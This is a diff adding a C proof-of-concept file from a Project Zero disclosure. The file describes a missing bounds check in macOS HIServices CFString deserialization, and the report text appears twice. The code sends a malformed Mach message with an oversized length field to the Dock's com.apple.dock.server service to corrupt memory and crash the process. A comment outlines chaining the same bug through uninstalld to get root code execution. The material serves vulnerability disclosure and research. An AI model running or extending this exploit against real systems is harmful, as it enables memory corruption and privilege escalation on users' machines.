@@ -1,0 +1,170 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1219
+
+HIServices.framework is used by a handful of deamons and implements its own CFObject serialization mechanism.
+
+The entrypoint to the deserialization code is AXUnserializeCFType; it reads a type field and uses that
+to index an array of function pointers for the support types:
+
+__const:0000000000053ED0 _sUnserializeFunctions dq offset _cfStringUnserialize
+__const:0000000000053ED0                                         ; DATA XREF: _AXUnserializeCFType+7Co
+__const:0000000000053ED0                                         ; _cfDictionaryUnserialize+E4o ...
+__const:0000000000053ED8                 dq offset _cfNumberUnserialize
+__const:0000000000053EE0                 dq offset _cfBooleanUnserialize
+__const:0000000000053EE8                 dq offset _cfArrayUnserialize
+__const:0000000000053EF0                 dq offset _cfDictionaryUnserialize
+__const:0000000000053EF8                 dq offset _cfDataUnserialize
+__const:0000000000053F00                 dq offset _cfDateUnserialize
+__const:0000000000053F08                 dq offset _cfURLUnserialize
+__const:0000000000053F10                 dq offset _cfNullUnserialize
+__const:0000000000053F18                 dq offset _cfAttributedStringUnserialize
+__const:0000000000053F20                 dq offset _axElementUnserialize
+__const:0000000000053F28                 dq offset _axValueUnserialize
+__const:0000000000053F30                 dq offset _cgColorUnserialize
+__const:0000000000053F38                 dq offset _axTextMarkerUnserialize
+__const:0000000000053F40                 dq offset _axTextMarkerRangeUnserialize
+__const:0000000000053F48                 dq offset _cgPathUnserialize
+
+From a cursory inspection it's clear that these methods don't expect to parse untrusted data.
+
+The first method, cfStringUnserialize, trusts the length field in the serialized representation
+and uses that to byte-swap the string without any bounds checking leading to memory corruption.
+
+I would guess that all the other unserialization methods should also be closely examined.
+
+This poc talks to the com.apple.dock.server service hosted by the Dock process. Although this also
+runs as the regular user (so doesn't represent much of a priv-esc) this same serialization mechanism
+is also used in replies to dock clients.
+
+com.apple.uninstalld is a client of the Dock and runs as root
+so by first exploiting this bug to gain code execution as the Dock process, we could
+trigger the same bug in uninstalld when it parses a reply from the dock and get code execution as root.
+
+This poc just crashes the Dock process though.
+
+Amusingly this opensource facebook code on github contains a workaround for a memory safety issue in cfAttributedStringUnserialize:
+https://github.com/facebook/WebDriverAgent/pull/99/files
+
+Tested on MacOS 10.12.3 (16D32)
+*/
+
+// ianbeer
+#if 0
+MacOS local EoP due to lack of bounds checking in HIServices custom CFObject serialization
+
+HIServices.framework is used by a handful of deamons and implements its own CFObject serialization mechanism.
+
+The entrypoint to the deserialization code is AXUnserializeCFType; it reads a type field and uses that
+to index an array of function pointers for the support types:
+
+__const:0000000000053ED0 _sUnserializeFunctions dq offset _cfStringUnserialize
+__const:0000000000053ED0                                         ; DATA XREF: _AXUnserializeCFType+7Co
+__const:0000000000053ED0                                         ; _cfDictionaryUnserialize+E4o ...
+__const:0000000000053ED8                 dq offset _cfNumberUnserialize
+__const:0000000000053EE0                 dq offset _cfBooleanUnserialize
+__const:0000000000053EE8                 dq offset _cfArrayUnserialize
+__const:0000000000053EF0                 dq offset _cfDictionaryUnserialize
+__const:0000000000053EF8                 dq offset _cfDataUnserialize
+__const:0000000000053F00                 dq offset _cfDateUnserialize
+__const:0000000000053F08                 dq offset _cfURLUnserialize
+__const:0000000000053F10                 dq offset _cfNullUnserialize
+__const:0000000000053F18                 dq offset _cfAttributedStringUnserialize
+__const:0000000000053F20                 dq offset _axElementUnserialize
+__const:0000000000053F28                 dq offset _axValueUnserialize
+__const:0000000000053F30                 dq offset _cgColorUnserialize
+__const:0000000000053F38                 dq offset _axTextMarkerUnserialize
+__const:0000000000053F40                 dq offset _axTextMarkerRangeUnserialize
+__const:0000000000053F48                 dq offset _cgPathUnserialize
+
+From a cursory inspection it's clear that these methods don't expect to parse untrusted data.
+
+The first method, cfStringUnserialize, trusts the length field in the serialized representation
+and uses that to byte-swap the string without any bounds checking leading to memory corruption.
+
+I would guess that all the other unserialization methods should also be closely examined.
+
+This poc talks to the com.apple.dock.server service hosted by the Dock process. Although this also
+runs as the regular user (so doesn't represent much of a priv-esc) this same serialization mechanism
+is also used in replies to dock clients.
+
+com.apple.uninstalld is a client of the Dock and runs as root
+so by first exploiting this bug to gain code execution as the Dock process, we could
+trigger the same bug in uninstalld when it parses a reply from the dock and get code execution as root.
+
+This poc just crashes the Dock process though.
+
+Amusingly this opensource facebook code on github contains a workaround for a memory safety issue in cfAttributedStringUnserialize:
+https://github.com/facebook/WebDriverAgent/pull/99/files
+
+Tested on MacOS 10.12.3 (16D32)
+#endif
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+#include <mach/mach.h>
+#include <mach/message.h>
+#include <servers/bootstrap.h>
+
+struct dock_msg {
+  mach_msg_header_t hdr;
+  mach_msg_body_t body;
+  mach_msg_ool_descriptor_t ool_desc;
+  uint8_t PAD[0xc];
+  uint32_t ool_size;
+};
+
+int main() {
+  kern_return_t err;
+  mach_port_t service_port;
+  err = bootstrap_look_up(bootstrap_port, "com.apple.dock.server", &service_port);
+  if (err != KERN_SUCCESS) {
+    printf(" [-] unable to lookup service");
+    exit(EXIT_FAILURE);
+  }
+  printf("got service port: %x\n", service_port);
+
+  uint32_t serialized_string[] =
+   { 'abcd',     // neither 'owen' or 'aela' -> bswap?
+     0x0,        // type = cfStringUnserialize
+     0x41414141, // length
+     0x41414141, // length
+     0x1,        // contents
+     0x2,
+     0x3 };
+
+	struct dock_msg m = {0};
+
+  m.hdr.msgh_size = sizeof(struct dock_msg);
+  m.hdr.msgh_local_port = MACH_PORT_NULL;
+  m.hdr.msgh_remote_port = service_port;
+  m.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
+  m.hdr.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
+  m.hdr.msgh_id = 0x178f4; // first message in com.apple.dock.server mig subsystem
+  m.ool_size = sizeof(serialized_string);
+
+  m.body.msgh_descriptor_count = 1;
+
+  m.ool_desc.type = MACH_MSG_OOL_DESCRIPTOR;
+  m.ool_desc.address = serialized_string;
+  m.ool_desc.size = sizeof(serialized_string);
+  m.ool_desc.deallocate = 0;
+  m.ool_desc.copy = MACH_MSG_PHYSICAL_COPY;
+
+  err = mach_msg(&m.hdr,
+                 MACH_SEND_MSG,
+                 m.hdr.msgh_size,
+                 0,
+                 MACH_PORT_NULL,
+                 MACH_MSG_TIMEOUT_NONE,
+                 MACH_PORT_NULL);
+
+  if (err != KERN_SUCCESS) {
+    printf(" [-] mach_msg failed with error code:%x\n", err);
+    exit(EXIT_FAILURE);
+  }
+  printf(" [+] looks like that sent?\n");
+
+  return 0;
+}
